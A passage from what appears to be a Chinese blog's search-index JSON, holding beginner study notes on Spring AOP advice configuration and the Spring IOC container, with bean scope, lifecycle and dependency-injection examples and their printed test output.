进行增强\nexecution(* com.atguigu.dao.BookDao.add(..))\n\n//例 2：对 com.dao.BookDao 类里面的所有的方法进行增强\nexecution(* com.atguigu.dao.BookDao.*(..))\n\n//例 3：对 com.dao 包里面所有类，类里面所有方法进行增强\nexecution(* com.atguigu.dao.*.*(..))\n```\n\n## 基于注解方式实现\n\nStep1：创建类，在类里面定义方法\n\n```java\n// 被增强的类\n@Component\npublic class User {\n    public void add() {\n        //int i = 10 / 0;\n        System.out.println(\"add ...\");\n    }\n}\n```\n\nStep2：创建增强类(编写增强逻辑)\n\n```java\n// 增强类\n@Component\n// 生成代理对象\n@Aspect\npublic class UserProxy {\n    // 前置通知 @Before:表示前置通知 value增强User的add方法\n    @Before(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void before() {\n        System.out.println(\"before前置通知 ...\");\n    }\n    // 最终通知\n    @After(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void after() {\n        System.out.println(\"after最终通知 ...\");\n    }\n    // 后置通知（返回通知）\n    @AfterReturning(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void afterReturning() {\n        System.out.println(\"afterReturning后置通知（返回通知） ...\");\n    }\n    // 异常通知\n    @AfterThrowing(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void afterThrowing() {\n        System.out.println(\"afterThrowing异常通知 ...\");\n    }\n    // 环绕通知\n    @Around(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable {\n        System.out.println(\"环绕通知around环绕之前 ...\");\n        // 执行被增强的方法\n        proceedingJoinPoint.proceed();\n        System.out.println(\"环绕通知around环绕之后 ...\");\n    }\n}\n```\n\nStep3：在 spring 配置文件中，进行通知的配置 \n\n- 1、开启context和aop命名空间\n- 2、开启注解包扫描\n- 3、开启AspectJ生成代理对象\n\n```xml\n<!-- 开启context和aop命名空间-->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\">\n\n    <!-- 开启注解扫描 -->\n    <context:component-scan base-package=\"com.jwt.aop\"></context:component-scan>\n    <!-- 开启Aspect生成代理对象-->\n    <aop:aspectj-autoproxy></aop:aspectj-autoproxy>\n</beans>\n```\n\nStep4：测试\n\n```java\npublic class TestBean {\n    @Test\n    public void test() {\n        //1 加载 spring 配置文件\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        //2 获取配置创建的对象\n        User user = context.getBean(\"user\", User.class);\n        System.out.println(user);\n        user.add();\n    }\n}\n/**\ncom.jwt.aop.User@3cebbb30\n环绕通知around环绕之前 ...\nbefore前置通知 ...\nadd ...\nafterReturning后置通知（返回通知） ...\nafter最终通知 ...\n环绕通知around环绕之后 ...\n**/\n```\n\n### 抽取公共切入点\n\n**定义公共切入点**\n\n```java\n@Pointcut(value = \"execution(* com.jwt.aop.User.add(..))\")\npublic void pointDemo() {}\n```\n\n**引用公共切入点**\n\n```java\n// 前置通知\n@Before(value = \"pointDemo()\")\npublic void before() {\n    System.out.println(\"before前置通知 ...\");\n}\n\n// 最终通知\n@After(value = \"pointDemo()\")\npublic void after() {\n  \tSystem.out.println(\"after最终通知 ...\");\n}\n```\n\n### 对同一切入点设置优先级\n\n场景：有多个增强类对同一个方法进行增强，设置增强类优先级\n\n```java\n@Component\n@Aspect\n@Order(0) // 对同一切入点增强的优先级 值越小优先级别越高\npublic class PersonProxy {\n}\n```\n\n```java\n@Component\n@Aspect\n@Order(1) // 对同一切入点增强的优先级 值越小优先级别越高\npublic class UserProxy {\n}\n```\n\nPersonProxy 比 UserProxy 先对方法进行增强\n\n## 完全使用注解开发\n\n创建配置类\n\n```java\n@Configuration// @Configuration作为配置类 替代xml配置文件\n@ComponentScan(basePackages = {\"com.jwt.aop\"})\n@EnableAspectJAutoProxy(proxyTargetClass = true)\npublic class SpringConfig2 {\n}\n```\n\n测试\n\n```java\n@Test\npublic void test2() {\n  AnnotationConfigApplicationContext context = \n    new AnnotationConfigApplicationContext(SpringConfig2.class);\n  User user = context.getBean(\"user\", User.class);\n  System.out.println(user);\n  user.add();\n}\n\n/**\ncom.jwt.aop.User@f736069\n环绕通知around环绕之前 ...\nbefore前置通知 ...\nadd ...\nafterReturning后置通知（返回通知） ...\nafter最终通知 ...\n环绕通知around环绕之后 ...\n**/\n```\n\n## 基于 xml 配置实现\n\nStep1：创建两个类,增强类和被增强类\n\n```java\npublic class Book {\n    public void buy() {\n        System.out.println(\"buy ...\");\n    }\n}\n\npublic class BookProxy {\n    public void before() {\n        System.out.println(\"before ...\");\n    }\n    public void after() {\n        System.out.println(\"after ...\");\n    }\n}\n```\n\nStep2：开启aop命名空间\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\">\n   \n</beans>   \n```\n\nStep3：在spring配置文件中创建两个类的实例对象\n\n```xml\n<!--创建对象-->\n<bean id=\"book\" class=\"com.jwt.aop.Book\"/>\n<bean id=\"bookProxy\" class=\"com.jwt.aop.BookProxy\"/>\n```\n\nStep4：在spring配置文件中配置切入点\n\n```xml\n<!--配置aop增强-->\n<aop:config>\n  <!--配置切入点-->\n  <aop:pointcut id=\"p\" expression=\"execution(* com.jwt.aop.Book.buy(..))\"/>\n  <!--配置切面-->\n  <aop:aspect ref=\"bookProxy\">\n    <!--把before方法作用在公共切入点指定的切入点上面-->\n    <aop:before method=\"before\" pointcut-ref=\"p\"/>\n\n    <!--不适用公共切入点-->\n    <aop:after method=\"after\" pointcut=\"execution(* com.jwt.aop.Book.buy(..))\"/>\n  </aop:aspect>\n</aop:config>\n```\n\nStep5：测试\n\n```java\n@Test\npublic void testAopXml() {\n  ClassPathXmlApplicationContext context = \n    new ClassPathXmlApplicationContext(\"bean3.xml\");\n  Book book = context.getBean(\"book\", Book.class);\n  book.buy();\n}\n/**\nbefore ...\nbuy ...\nafter ...\n**/\n```\n\n## 参考\n\n- [Spring-AOP概念及使用教程](https://blog.csdn.net/weixin_45496190/article/details/107082732?spm=1001.2014.3001.5502)\n- [Spring-AOP](https://blog.csdn.net/xiaoyixiao_/article/details/116851579?spm=1001.2014.3001.5502)\n\n##  ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-IOC","url":"/posts/18155.html","content":"\n## 前言\n\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《Spring-IOC》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计2天更新完\n- [x] 🎯开始时间：04-10\n- [x] 🎉结束时间：04-12\n- [x] 🍀总结：超时一天！！！\n\n## Spring 概述\n\n### 简介\n\n-  Spring 是轻量级的开源的JavaEE框架\n- Spring 可以解决企业应用开发的复杂性 \n\n- Spring 有两个核心部分：IOC 和 AOP\n  - IOC：控制反转，把创建对象过程交给 Spring 进行管理 \n  - AOP：面向切面，不修改源代码进行功能增强\n\n###  特点\n\n- 1、方便解耦，简化开发 \n- 2、AOP 编程支持 \n- 3、方便程序测试\n- 4、方便和其他框架进行整合\n- 5、方便进行事务操作 \n- 6、降低 API开发难度 \n\n### 优点\n\n- 轻量级：Spring 在大小和透明性方面绝对属于轻量级的，基础版本的 Spring 框架大约只有2MB。\n\n- 控制反转(IOC)：Spring 使用控制反转技术实现了松耦合。依赖被注入到对象，而不是创建或寻找依赖对象。\n\n- 面向切面编程(AOP)： Spring 支持面向切面编程，同时把应用的业务逻辑与系统的服务分离开来。\n\n- 容器：Spring 包含并管理应用程序对象的配置及生命周期。\n\n- MVC框架：Spring 的 Web 框架是一个设计优良的 Web MVC 框架。\n\n- 事务管理：Spring 对下至本地业务上至全局业务(JAT)提供了统一的事务管理接口。\n\n- 异常处理：Spring 提供一个方便的 API 将特定技术的异常转化为一致的、Unchecked异常。\n\n### Spring 架构图\n\nSpring 总共大约有 20 个模块， 由 1300 多个不同的文件构成。\n\n![](https://img.jwt1399.top/img/spring-overview.png)\n\n## 快速入门\n\n### 环境配置\n\n#### 下载 Spring JAR 包\n\n- 1、查看最新发布版本：https://spring.io/projects/spring-framework#learn（带红色GA标签的）\n\n- 2、下载对应版本： https://repo.spring.io/release/org/springframework/spring/ \n\n下载完成后解压，解压后的文件目录结构如下所示：\n\n```bash\n.\n├── docs  #API文档和开发规范\n├── libs  #开发需要的JAR包和源码\n├── license.txt\n├── notice.txt\n├── readme.txt\n└── schema #开发所需要的schema文件\n```\n\nlibs 目录中的 JAR 包分为三类\n\n- RELEASE.jar 结尾的是 Spring 框架 class 文件的 JAR 包\n- RELEASE-javadoc.jar 结尾的是 Spring 框架 API 文档的压缩包\n- RELEASE-sources.jar 结尾的是 Spring 框架源文件的压缩包\n\n整个 Spring 框架由大约 20 个模块组成，该目录下 Spring 为每个模块都提供了这三类压缩包。\n\n#### 下载第三方依赖包\n\n使用 Spring 开发时，除了要使用自带的JAR包外，Spring的核心容器还需要依赖 **commons.logging** 的JAR包。\n\n- 1、下载 commons-logging-1.2-bin.tar.gz，下载地址：[Download Apache Commons Logging](https://commons.apache.org/proper/commons-logging/download_logging.cgi)\n- 2、下载完成后解压，将 commons-logging-1.2.jar 导入项目\n\n#### 导入核心JAR包\n\n在 libs目录中，有四个 Spring 的基础包，分别对应 Spring 核心容器的四个模块。      \n\n- spring-core-5.x.x.RELEASE.jar\n- spring-beans-5.x.x.RELEASE.jar\n- spring-context-5.x.x.RELEASE.jar\n- spring-expression-5.x.x.RELEASE.jar\n\n初学者学习 Sping 框架时，只需将 **Sping 的 4 个基础包**以及 **commons-logging-1.2.jar** 复制到项目的 lib 目录，并发布到类路径中即可。\n\n```bash\n.\n├── commons-logging-1.2.jar\n├── spring-beans-5.3.18.jar\n├── spring-context-5.3.18.jar\n├── spring-core-5.3.18.jar\n└── spring-expression-5.3.18.jar\n```\n\n### 创建User类\n\n```java\npublic class User {\n    public void add(){\n        System.out.println(\"add.......\");\n    }\n}\n```\n\n### 创建配置文件bean1.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    <!--配置User对象创建-->\n    <bean id=\"user\" class=\"com.jwt.User\"/>\n</beans>\n```\n\n### 编写测试类BeanTest\n\n```java\npublic class BeanTest {\n    @Test\n    public void testAdd() {\n        //1 加载 spring 配置文件\n        ApplicationContext context = \n                new ClassPathXmlApplicationContext(\"bean1.xml\");\n        //2 获取配置创建的对象\n        User user = context.getBean(\"user\", User.class);\n        System.out.println(user);\n        user.add();\n    }\n}\n/**\ncom.jwt.User@6950e31\nadd.......\n**/\n```\n\n## IOC概念\n\n- IOC(控制反转)，把对象创建和对象之间的调用过程，交给 Spring 进行管理 \n- 使用IOC目的：为了降低耦合度\n- IOC底层原理：xml 解析、工厂模式、反射 \n\n- IOC 思想基于 IOC 容器完成，IOC 容器底层就是对象工厂\n\n**Spring 提供 IOC 容器两种实现方式：（两个接口）** \n\n- 1、BeanFactory：IOC 容器基本实现，是 Spring 内部的使用接口，不提供开发人员进行使用 ，加载配置文件时候不会创建对象，在获取对象（使用）才去创建对象 \n\n- 2、ApplicationContext：BeanFactory 接口的子接口，提供更多更强大的功能，一般由开发人员进行使用，加载配置文件时候就会把在配置文件对象进行创建，ApplicationContext 接口有实现类 \n\n**ApplicationContext 接口实现类** \n\n- FileSystemXmlApplicationContext ：此容器从一个 XML 文件中加载 beans 的定义，必须提供XML Bean 配置文件的**全路径名**给它的构造函数。\n- ClassPathXmlApplicationContext：此容器从一个 XML 文件中加载 beans 的定义，你需要正确设置 classpath 容器将在 classpath 里找 bean 配置。\n\n## IOC**操作**Bean管理\n\n### **Bean管理指的是两个操作**\n\n- 1、Spring 创建对象\n- 2、Spirng 注入属性 \n\n### **Bean管理操作有两种方式**\n\n- 1、基于 xml 配置文件方式实现\n- 2、基于注解方式实现 \n\nSpring 有两种类型 Bean，一种是普通 Bean，另外一种是工厂 Bean（FactoryBean）\n\n### 普通Bean\n\n在配置文件中**定义bean类型就是返回类型**\n\n```java\npublic class MyBean {\n}\n```\n\n```xml\n<!--普通bean-->\n<bean id=\"myBean\" class=\"com.jwt.MyBean\"></bean>\n```\n\n```java\n@Test\npublic void testBean() {\n    ClassPathXmlApplicationContext context = \n      new ClassPathXmlApplicationContext(\"bean.xml\");\n    MyBean bean = context.getBean(\"myBean\", MyBean.class);\n    System.out.println(bean);\n}\n//com.jwt.MyBean@49c43f4e\n```\n\n### 工厂Bean\n\n工厂Bean：在配置文件**定义 bean 类型可以和返回类型不一致**\n\n第一步：创建类，让这个类作为工厂Bean，实现接口FactoryBean\n\n第二步：实现接口里面的方法，在实现的方法中定义返回的Bean类型\n\n```java\npublic class MyBean implements FactoryBean<Course> {\n    // 定义返回Bean类型的对象\n    @Override\n    public Course getObject() throws Exception {\n        Course course = new Course();\n        course.setCname(\"工厂bean\");\n        return course;\n    }\n    // 得到对象类型\n    @Override\n    public Class<?> getObjectType() {\n        return null;\n    }\n    // 是否是单例模式\n    @Override\n    public boolean isSingleton() {\n        return false;\n    }\n}\n```\n\n```xml\n<!--工厂bean-->\n<bean id=\"myBean\" class=\"com.jwt.MyBean\"></bean>\n```\n\n```java\n@Test\npublic void testFactoryBean() {\n    ClassPathXmlApplicationContext context = \n      new ClassPathXmlApplicationContext(\"bean.xml\");\n    Course bean = context.getBean(\"myBean\", Course.class);\n    System.out.println(bean);\n}\n\n//Course{cname='工厂bean'}\n```\n\n### Bean作用域\n\n在 Spring 里面，设置创建 Bean 实例是单实例还是多实例，默认情况下，**Bean 是单实例对象**\n\n证明：创建二个 Bean 的实例对象，实例对象的地址相同说明是同一对象，也就是 Bean 是单例对象\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n  <property name=\"bname\" value=\"小明\"></property>\n  <property name=\"bauthor\" value=\"小简\"></property>\n</bean>\n```\n\n```java\n@Test\npublic void test() {\n  ApplicationContext context =\n    new ClassPathXmlApplicationContext (\"bean3.xml\") ;\n  Book book1 = context.getBean(\"book\" , Book.class);\n  Book book2 = context.getBean(\"book\" , Book.class);\n  System.out.println (book1);\n  System.out.println (book2);\n}\n\n/**相同\ncom.jwt.ioc.Book@548ad73b\ncom.jwt.ioc.Book@548ad73b\n**/\n```\n\n**如何设置单实例还是多实例** \n\n- 在 Spring 配置文件 bean 标签里面有属性（scope）用于设置单实例还是多实例\n\n- scope 属性值\n  - singleton，默认值，表示是单实例对象 \n  - prototype，表示是多实例对象 \n\n**singleton和prototype区别** \n\n- singleton 表示单实例，prototype 表示多实例。\n\n- 设置 scope 为 singleton 的时候，在加载 Spring 配置文件时候就会创建单实例对象，\n\n- 如果 scope 为 prototype 的时候，不是在加载 Spring 配置文件的时候创建对象，而是在调用 getBean 方法的时候创建多实例对象\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\" scope=\"prototype\">\n  <property name=\"bname\" value=\"小明\"></property>\n  <property name=\"bauthor\" value=\"小简\"></property>\n</bean>\n```\n\n```java\n@Test\npublic void test() {\n  ApplicationContext context =\n    new ClassPathXmlApplicationContext (\"bean3.xml\") ;\n  Book book1 = context.getBean(\"book\" , Book.class);\n  Book book2 = context.getBean(\"book\" , Book.class);\n  System.out.println (book1);\n  System.out.println (book2);\n}\n\n/**不相同\ncom.jwt.ioc.Book@eb21112\ncom.jwt.ioc.Book@2eda0940\n**/\n```\n\n### Bean生命周期\n\n**Bean生命周期：从对象创建到对象销毁的过程**\n\n- 1、通过构造器创建 bean 实例（无参数构造）\n- 2、为 bean 的属性设置值和对其他 bean 引用（调用set方法）\n- 3、调用 bean 的初始化的方法（需要进行配置初始化的方法）\n- 4、bean 可以使用了（对象获取到了）\n- 5、当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法）\n\n**演示Bean生命周期** \n\n```java\npublic class Orders {\n    private String oname;\n    public Orders() {\n        System.out.println(\"第一步 执行无参构造器创建bean实例\");\n    }\n    public void setOname(String oname) {\n        System.out.println(\"第二步 调用set方法设置属性值\");\n        this.oname = oname;\n    }\n    // 创建执行的初始化方法\n    public void initMethod() {\n        System.out.println(\"第三步 执行初始化方法\");\n    }\n    // 创建执行的销毁方法\n    public void destroyMethod(){\n        System.out.println(\"第五步 执行销毁方法\");\n    }\n}\n```\n\n```xml\n<!--bean声明周期-->\n<bean id=\"orders\" class=\"com.jwt.ioc.Orders\" init-method=\"initMethod\" destroy-method=\"destroyMethod\">\n  <property name=\"oname\" value=\"电脑\"/>\n</bean>\n```\n\n```java\n@Test\npublic void testBeanLive() {\n  ClassPathXmlApplicationContext context =\n    new ClassPathXmlApplicationContext(\"bean5.xml\");\n  Orders bean = context.getBean(\"orders\", Orders.class);\n  System.out.println(\"第四步 获取创建bean实例的对象\"+bean);\n  context.close();// 手动让bean销毁\n}\n/**\n第一步 执行无参构造器创建bean实例\n第二步 调用set方法设置属性值\n第三步 执行初始化方法\n第四步 获取创建bean实例的对象com.jwt.ioc.Orders@954b04f\n第五步 执行销毁方法\n**/\n```\n\n**如果有bean后置处理器，则bean的生命周期有七种**\n\n- 1、通过构造器创建 bean 实例（无参数构造）\n\n- 2、为 bean 的属性设置值和对其他 bean 引用（调用 set 方法）\n\n- **3**、把 bean 实例传递 bean 后置处理器的方法 postProcessBeforeInitialization\n\n- 4、调用 bean 的初始化的方法（需要进行配置初始化的方法）\n\n- **5**、把 bean 实例传递 bean 后置处理器的方法 postProcessAfterInitialization\n\n- 6、bean 可以使用了（对象获取到了）\n\n- 7、当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法）\n\n配置后置处理器，实现 BeanPostProcessor 接口\n\n```java\npublic class MyBeanPost implements BeanPostProcessor {\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        System.out.println(\"在初始化之前执行的方法\");\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {\n        System.out.println(\"在初始化之后执行的方法\");\n        return bean;\n    }\n}\n```\n\n```xml\n<!--配置后置处理器 配置之后会为所有的bean实例添加后置处理器-->\n<bean id=\"myBeanPost\" class=\"com.jwt.ioc.MyBeanPost\"></bean>\n```\n\n```java\n@Test\npublic void testBeanLive() {\n  ClassPathXmlApplicationContext context =\n    new ClassPathXmlApplicationContext(\"bean5.xml\");\n  Orders bean = context.getBean(\"orders\", Orders.class);\n  System.out.println(\"第四步 获取创建bean实例的对象\"+bean);\n  context.close();// 手动让bean销毁\n}\n\n/**\n第一步 执行无参构造器创建bean实例\n第二步 调用set方法设置属性值\n在初始化之前执行的方法\n第三步 执行初始化方法\n在初始化之后执行的方法\n第四步 获取创建bean实例的对象com.jwt.ioc.Orders@481a15ff\n第五步 执行销毁方法\n**/\n```\n\n## 基于xml方式\n\n### 基于xml创建对象\n\n1、在spring配置文件中，使用 bean 标签，标签里面添加对应属性，就可以实现对象创建\n\n2、在bean标签有很多属性，常用的属性：\n\n* id属性：唯一标识 \n* class属性：类全路径（包类路径） \n\n3、创建对象时候，默认也是执行无参数构造方法完成对象创建 \n\n```xml\n<!--配置User对象创建-->\n<bean id=\"user\" class=\"com.jwt.User\"></bean>\n```\n\n### 基于xml注入属性\n\n> 基于 xml 注入属性就是依赖注入(DI)\n\n#### 1、使用set方法进行注入\n\nStep1：创建类，定义属性和对应的set方法\n\n```java\npublic class Book {\n    //创建属性\n    private String bname;\n    private String bauthor;\n\n    //创建属性对应的set方法\n    public void setBname(String bname) {\n        this.bname = bname;\n    }\n    public void setBauthor(String bauthor) {\n        this.bauthor = bauthor;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book{\" +\n                \"bname='\" + bname + '\\'' +\n                \", bauthor='\" + bauthor + '\\'' +\n                '}';\n    }\n}\n```\n\nStep2：配置xml文件创建对象，用 property 标签注入属性\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n  <!--使用property完成属性注入\n \t\t\tname：类里面属性名称 \n\t\t\tvalue：向属性注入的值 -->\n  <property name=\"bname\" value=\"Java入门到精通\"></property>\n  <property name=\"bauthor\" value=\"小简\"></property>\n</bean>\n```\n\nStep3：测试\n\n```java\npublic class BookTest {\n    @Test\n    public void test(){\n        //1 加载 spring 配置文件\n        ClassPathXmlApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        //2 获取配置创建的对象\n        Book book = context.getBean(\"book\", Book.class);\n        System.out.println(book);\n    }\n}\n\n//Book{bname='Java入门到精通', bauthor='小简'}\n```\n\n#### 2、使用有参数构造进行注入\n\nStep1：创建类，定义属性，创建属性对应有参数构造方法 \n\n```java\npublic class Order {\n    private String oname;\n    private String address;\n\n    public Order(String oname, String address) {\n        this.oname = oname;\n        this.address = address;\n    }\n\n    @Override\n    public String toString() {\n        return \"Order{\" +\n                \"oname='\" + oname + '\\'' +\n                \", address='\" + address + '\\'' +\n                '}';\n    }\n}\n```\n\nStep2：配置xml文件创建对象\n\n```xml\n<bean id=\"order\" class=\"com.jwt.ioc.Order\">\n    <!--通过属性名称注入-->\n    <constructor-arg name=\"oname\" value=\"电脑\"></constructor-arg>\n    <constructor-arg name=\"address\" value=\"China\"></constructor-arg>\n    <!--通过索引名称注入-->\n    <!--<constructor-arg index=\"0\" value=\"平板\"></constructor-arg>-->\n    <!--<constructor-arg index=\"1\" value=\"china\"></constructor-arg>-->\n</bean>\n```\n\nStep3：测试\n\n```java\npublic class OrderTest {\n    @Test\n    public void test(){\n        ClassPathXmlApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        Order order = context.getBean(\"order\", Order.class);\n        System.out.println(order);\n    }\n}\n\n//Order{oname='电脑', address='China'}\n```\n\n### p名称空间注入\n\n> 使用p名称空间注入，可以简化基于 xml 配置方式\n\nStep1：添加p名称空间到配置文件中`xmlns:p=\"http://www.springframework.org/schema/p\"`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:p=\"http://www.springframework.org/schema/p\" \n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n</beans>\n```\n\nStep2：通过p标签进行属性注入\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\" p:bname=\"Spring入门\" p:bauthor=\"无名氏\"></bean>\n```\n\n### 注入空值和特殊符号\n\n设置空值：在属性property里使用null标签实现\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n    <property name=\"bname\" value=\"Spring学习\"/>\n    <!--设置null值-->\n    <property name=\"bauthor\">\n        <null></null>\n    </property>\n</bean>\n\n<!--Book{bname='Spring学习', bauthor='null'}-->\n```\n\n设置特殊符号：在属性property里使用 **value 标签**通过 **\\<![CDATA[xxx]]>** 实现\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n    <property name=\"bname\" value=\"Spring学习\"/>\n    <property name=\"bauthor\">\n      \t<value><![CDATA[<<西游记>>]]></value>\n    </property>\n</bean>\n\n<!--Book{bname='Spring学习', bauthor='<<西游记>>'}-->\n```\n\n### 注入外部bean\n\n场景：service层调用dao层\n\nStep1：创建两个类 service类和dao类\n\n```java\npackage com.jwt.Service;\n\nimport com.jwt.dao.UserDao;\nimport com.jwt.dao.UserDaoImpl;\n\npublic class UserService {//service类\n\n    //创建UserDao类型属性，生成set方法\n    private UserDao userDao;\n    public void setUserDao(UserDao userDao) {\n        this.userDao = userDao;\n    }\n\n    public void add() {\n        System.out.println(\"service add...............\");\n        //传统方法\n        //UserDao userDao = new UserDaoImpl();\n        //userDao.update();\n\n        this.userDao.update();//调用dao方法\n    }\n}\n```\n\n```java\npackage com.jwt.dao;\n\npublic interface UserDao {\n    public void update();\n}\n```\n\n```java\npackage com.jwt.dao;\n\npublic class UserDaoImpl implements UserDao {//dao类\n    @Override\n    public void update() {\n        System.out.println(\"dao update...........\");\n    }\n}\n\n```\n\nStep2：在spring配置文件中进行配置，使用属性property的ref注入外部对象\n\n```xml\n<!--service和dao对象创建-->\n<bean id=\"userService\" class=\"com.jwt.Service.UserService\">\n  <!--注入userDao对象\n      name属性：类里面的属性名称\n      ref属性：创建userDao对象bean标签id值\n  -->\n  <property name=\"userDao\" ref=\"userDaoImpl\"></property>\n</bean>\n<bean id=\"userDaoImpl\" class=\"com.jwt.dao.UserDaoImpl\"></bean>\n```\n\nStep3：测试\n\n```java\npackage com.jwt.testdemo;\n\npublic class BeanTest {\n    @Test\n    public  void test(){\n        //1 加载 spring 配置文件\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        //2 获取配置创建的对象\n        UserService userService = context.getBean(\"userService\", UserService.class);\n        userService.add();\n    }\n}\n\n/**\nservice add...............\ndao update...........\n**/\n```\n\n### 注入内部bean和级联赋值\n\n（1）一对多关系：部门和员工，一个部门有多个员工，一个员工属于一个部门\n（2）在实体类之间表示一对多关系，员工表示所属部门，使用对象类型属性进行表示\n\nStep1：创建部门和员工类\n\n```java\npublic class Department {\n    private String dname;\n\n    public void setDname(String dname) {\n        this.dname = dname;\n    }\n\n    @Override\n    public String toString() {\n        return \"Department{\" +\n                \"dname='\" + dname + '\\'' +\n                '}';\n    }\n}\n```\n\n```java\npublic class Employee {\n    private String ename;\n    private String gender;\n    //员工属于某一个部门，使用对象形式表示\n    private Department dept;\n\n    public Department getDept() {//级联注入第二种需要这个方法\n        return dept;\n    }\n\n    public void setDept(Department dept) {\n        this.dept = dept;\n    }\n\n    public void setEname(String ename) {\n        this.ename = ename;\n    }\n\n    public void setGender(String gender) {\n        this.gender = gender;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee{\" +\n                \"ename='\" + ename + '\\'' +\n                \", gender='\" + gender + '\\'' +\n                \", dept=\" + dept +\n                '}';\n    }\n}\n```\n\nStep2：在 spring配置文件中进行配置\n\n- 第一种写法：内部bean(在bean里面嵌套bean)\n\n```xml\n<bean id=\"emp\" class=\"com.jwt.ioc.Employee\">\n  <!--设置两个普通属性-->\n  <property name=\"ename\" value=\"lucy\"></property>\n  <property name=\"gender\" value=\"女\"></property>\n  <!--设置对象类型属性-->\n  <property name=\"dept\">\n    <bean id=\"dept\" class=\"com.jwt.ioc.Department\">\n      <property name=\"dname\" value=\"安保部\"></property>\n    </bean>\n  </property>\n</bean>\n```\n\n- 第二种写法：ref级联赋值1\n\n```xml\n<!--级联赋值-->\n<bean id=\"emp\" class=\"com.jwt.ioc.Employee\">\n  <!--设置两个普通属性-->\n  <property name=\"ename\" value=\"lucy\"></property>\n  <property name=\"gender\" value=\"女\"></property>\n  <!--级联赋值-->\n  <property name=\"dept\" ref=\"dept\"></property>\n</bean>\n<bean id=\"dept\" class=\"com.jwt.ioc.Department\">\n  <property name=\"dname\" value=\"财务部\"></property>\n</bean>\n```\n\n- 第三种写法：ref级联赋值2\n\n```xml\n<!--级联赋值-->\n<bean id=\"emp\" class=\"com.jwt.ioc.Employee\">\n  <!--设置两个普通属性-->\n  <property name=\"ename\" value=\"lucy\"></property>\n  <property name=\"gender\" value=\"女\"></property>\n  <!--级联赋值-->\n  <property name=\"dept\" ref=\"dept\"></property>\n  <property name=\"dept.dname\" value=\"技术部\"></property>\n</bean>\n<bean id=\"dept\" class=\"com.jwt.ioc.Department\">\n  <property name=\"dname\" value=\"财务部\"></property>\n</bean>\n```\n\nStep3：测试\n\n```java\npublic class BeanTest {\n\t@Test\n  public  void test2(){\n    //1 加载 spring 配置文件\n    ApplicationContext context =\n      new ClassPathXmlApplicationContext(\"bean4.xml\");\n    //2 获取配置创建的对象\n    Employee emp = context.getBean(\"emp\", Employee.class);\n    System.out.println(emp);\n  }\n}\n\n//写法1：Employee{ename='lucy', gender='女', dept=Department{dname='安保部'}}\n//写法2：Employee{ename='lucy', gender='女', dept=Department{dname='财务部'}}\n//写法3：Employee{ename='lucy', gender='女', 